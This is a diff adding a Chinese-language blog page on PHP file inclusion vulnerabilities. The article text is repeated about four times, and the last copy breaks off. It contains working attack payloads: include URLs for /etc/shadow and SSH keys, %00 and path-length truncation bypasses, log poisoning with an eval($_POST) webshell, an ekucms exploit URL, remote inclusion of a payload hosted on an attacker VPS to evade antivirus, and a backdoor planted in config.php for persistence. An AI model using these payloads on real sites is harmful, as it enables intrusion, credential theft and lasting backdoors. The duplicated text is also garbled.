@@ -1,0 +1,2060 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>php文件包含漏洞 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="php文件包含漏洞 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="php文件包含漏洞
+在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              php文件包含漏洞
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                63 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h4 id="php文件包含漏洞">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-2">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-2">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-2">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-2">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-2">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-2">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-2">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-2">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-2">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-2">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-2">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-2">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-2">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-2">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-2">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-2">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-3">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-3">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-3">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-3">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-3">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-3">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
+<li>此时访问测试：<code>http://192.168.1.3/fileinclude/news.php?id=test.txt</code>。将<code>test.txt</code>文件传送给<code>id</code>参数并复制给<code>test</code>变量，然后<code>txt</code>文件被当作<code>php</code>脚本脚本文件执行。</li>
+</ul>
+<p>同时也可以任意包含，根据物理路径读取服务器敏感文件：</p>
+<pre><code>
+# 常见敏感文件l
+http://192.168.1.3/fileinclude/news.php?id=c:\\1.txt
+www.test.com/test.php?test=../../../../../etc/passwod
+www.test.com/test.php?test=/etc/shadow
+www.test.com/test.php?test=/etc/php5/apache2/php.ini
+www.test.com/test.php?test=/etc/mysql/my.cnf
+www.test.com/test.php?test=/etc/apache2/apache2.conf
+------------------------------------------------------------------------------
+windows敏感文件：
+c:\\boot.ini
+# 查看系统版本
+c:\\windows\\system32\\inetsrv\\metabase.xml
+# 查看iis配置文件
+c:\\windows\\repair\\sam
+# 存储系统初次安装的密码
+c:\\program files\\mysql\\my.ini
+# mysql配置文件
+c:\\program files\\mysql\\data\\mysql\\user.myd
+# mysql root密码
+c:\\windows\\php.ini
+# php配置信息
+c:\\windows\\my.ini
+# mysql配置信息
+-------------------------------------------------------------------------------
+/root/.ssh/authorized_keys
+/root/.ssh/id_rsa
+/root/.ssh/id_ras.keystore
+/root/.ssh/known_hosts
+/etc/passwd
+/etc/shadow
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf
+/root/.bash_history
+/root/.mysql_history
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+</code></pre>
+<h4 id="附加后缀截断-3">附加后缀截断</h4>
+<p>例如包含读取/etc/passwd文件，网站源码会给一个后缀形成如：/etc/passwd.php,导致无法读取文件内容。具体代码如下，此时该代码存在文件包含漏洞，由于在漏洞利用被包含的文件会被添加上.php后缀，无法直接利用。</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test).'.php';
+?&gt;
+</code></pre>
+<h5 id="绕过方法一00截断-3">绕过方法一：%00截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt%00
+</code></pre>
+<p><mark><strong>注意</strong>：%00截断包含适合php版本&lt;5.3.4，对应版本的配置文件magic_quotes_gps=off，才能够进行绕过，否则%00会被转义。</mark></p>
+<h5 id="绕过方法二文件名附加进行长度截断-3">绕过方法二：文件名附加./././././.进行长度截断</h5>
+<pre><code>http://www.test.com/test/a.php?c=1.txt/././././././././././././././././././.
+</code></pre>
+<p><mark>注意：Windows服务器字节长度应大于256，Linux要大于4096</mark></p>
+<h4 id="包含日志拿shell-3">包含日志拿shell</h4>
+<pre><code>#文件包含漏洞读取apache配置文件
+index.php?page=/etc/init.d/httpd
+index.php?page=/etc/httpd/conf/httpd.conf
+#Linux默认访问url的日志
+/var/log/httpd/access_log 
+#网站访问日志无权限访问，但是cms本身会记录错误日志，这种日志可以访问
+</code></pre>
+<h5 id="拿shell步骤-3">拿shell步骤</h5>
+<ol>
+<li>
+<p>访问../file.php?id=1<?php @eval($_POST[a]);?></p>
+</li>
+<li>
+<p>后台在/var/log/httpd/acess_log 会生成带有一句话的日志，相当与将一句话以.log形式写入了网站目录</p>
+</li>
+<li>
+<p>然后根据文件包含漏洞&gt;连接../file.php?file=…/…/…/…/var/log/httpd/acess_log，getshell</p>
+</li>
+</ol>
+<h5 id="实列-3">实列</h5>
+<p>ekucms某版本存在文件包含漏洞</p>
+<ol>
+<li>通过访问该url，将一句话木马写入日志文件中</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/{~eval($_POST[x])}
+</code></pre>
+<ol start="2">
+<li>该日志是以时间日期命名的，用菜刀连接该日志文件，得到shell</li>
+</ol>
+<pre><code>http://192.168.1.3/ekucms2.4.1/?s=my/show/id/\..\temp\logs\20_05_18.log
+</code></pre>
+<h4 id="读源代码-3">读源代码</h4>
+<p>直接读取php文件返回的是代码编译解析后的结果，并不能看到源代码。</p>
+<pre><code>http://192.168.1.3/news.php?id=shell.php
+</code></pre>
+<p>直接看会出错，</p>
+<p>此时可以使用封装伪协议读取：</p>
+<pre><code>http://192.168.1.3/news.php?id=php://filter/read=convert.base64-encode/resource=shell.php
+//核心代码：id=php://filter/read=convert.base64-encode/resource=
+//读出源代码，原理是将文件内容进行base64加密，使代码不运行解析，直接读出源代码。
+</code></pre>
+<h4 id="远程文件包含-3">远程文件包含</h4>
+<p>远程文件包含文件名不能为<code>php</code>可解析的扩展名。另外远程文件包含要确保<code>php.ini</code>中<code>allow_url_fopen</code>和<code>allow_url_include</code>状态为<code>on</code>。为躲避杀软将大马放到自己的<code>vps</code>上然后远程包含。<br>
+<img src="https://i.loli.net/2020/10/13/NztbgUdlCrpWDMO.png" alt="1602574661_1_.jpg" loading="lazy"></p>
+<pre><code>http://192.168.1.3/1.php?file=http://www.xxxx.com/1.png
+</code></pre>
+<h5 id="远程包含限制绕过后缀名限制-3">远程包含限制绕过后缀名限制</h5>
+<pre><code>#源代码
+&lt;?php 
+include($_GET['filename'] . &quot;.html&quot;); 
+?&gt;
+</code></pre>
+<p>与本地包含类似，如果源码存在后缀名限制，直接进行远程包含的话会报错如下：<br>
+<img src="https://i.loli.net/2020/10/13/wY8umDG42j5crZ6.png" alt="1602574772_1_.jpg" loading="lazy"></p>
+<p>绕过方法：</p>
+<pre><code>filename=http://www.xxx.com/FI/php.txt?
+filename=http://www.xxx.com/FI/php.txt%23
+filename=http://www.xxxi8.com/FI/php.txt%20
+filename=http://www.xxx.com/FI/php.txt%00
+</code></pre>
+<h5 id="利用远程文件包含进行权限维持-3">利用远程文件包含进行权限维持</h5>
+<p><code>include</code>代码不会报毒。所以我们在<code>getshell</code>后在网站配置文件中写入包含代码(如：<code>config.php,&lt;?php include($_GET['x']);?&gt;</code>管理员一般不会修改配置文件源代码)里面插入文件包含代码。如果目标<code>allow_url_fopen</code>和<code>allow_url_include</code>状态都为<code>on</code>。既可以永久进行远程包含，达到权限维持的目的。</p>
+<h4 id="php文件包含漏洞-4">php文件包含漏洞</h4>
+<p>在开发中，开发人员会将一些重复使用的代码函数汇总放到单个文件中，需要使用某个函数时直接调用此文件。这个调用过程称为文件包含。为了使代码更灵活，将被包含的文件设置为变量用来进行动态调用。这就导致客户端可以调用一个恶意文件，造成文件包含漏洞。文件包含漏洞在php中居多。造成执行任意代码、包含恶意文件控制网站、敏感文件读取等危害</p>
+<h4 id="常见包含函数-4">常见包含函数</h4>
+<ul>
+<li>
+<p><code>include()</code>：执行到include时才包含文件，找不到被包含文件时产生警告，但是脚本继续执行。</p>
+</li>
+<li>
+<p><code>require()</code>：程序一运行就包含文件，找不到被包含的文件产生致命错误，脚本停止运行</p>
+</li>
+<li>
+<p><code>include_once&amp;require_once()</code>：这两个函数行为与<code>include/require</code>类似，区别在于他们只做一次包含，即如果文件中代码已经被包含则不会再次被包含</p>
+</li>
+</ul>
+<h4 id="利用条件-4">利用条件</h4>
+<ol>
+<li>
+<p>程序用include()等文件包含函数通过动态变量的方式引入需要包含的文件</p>
+</li>
+<li>
+<p>用户能够控制该动态变量</p>
+</li>
+<li>
+<p>配置文件php.ini中参数allow_url_fopen=open，此参数默认为open</p>
+</li>
+<li>
+<p>远程包含则需要php.ini中参数allow_url_include=open，此参数默认为close</p>
+</li>
+</ol>
+<h4 id="文件包含-4">文件包含</h4>
+<ol>
+<li>
+<p>本地文件包含：上传带有shell代码的任意格式文件，利用文件包含漏洞将该文件当作脚本格式解析。</p>
+</li>
+<li>
+<p>远程文件包含：在远程服务器上放置大马以此绕过杀软提权</p>
+</li>
+</ol>
+<h4 id="利用方法-4">利用方法</h4>
+<ul>
+<li>
+<p>包含日志文件getshell</p>
+</li>
+<li>
+<p>包含data:或php://input等伪协议</p>
+</li>
+<li>
+<p>若有phpinfo则可以包含临时文件</p>
+</li>
+<li>
+<p>如果一个网站有文件包含但是无法getshell，尝试在旁站上上传图片马，然后进行文件包含拿shell</p>
+</li>
+</ul>
+<h4 id="实例-4">实例</h4>
+<p>假如目标网站有news.php文件，文件内容为：</p>
+<pre><code>&lt;?php
+$test=$_GET['id'];   
+include($test);
+?&gt;
+</code></pre>
+<p>此时该文件存在文件包含漏洞。include函数通过动态变量的方式引入需要包含的文件，若用户能控制该变量；在同级目录下上传test.txt文件,内容为：</p>
+<pre><code>&lt;?php phpinfo()?&gt;
+</code></pre>
+<ul>
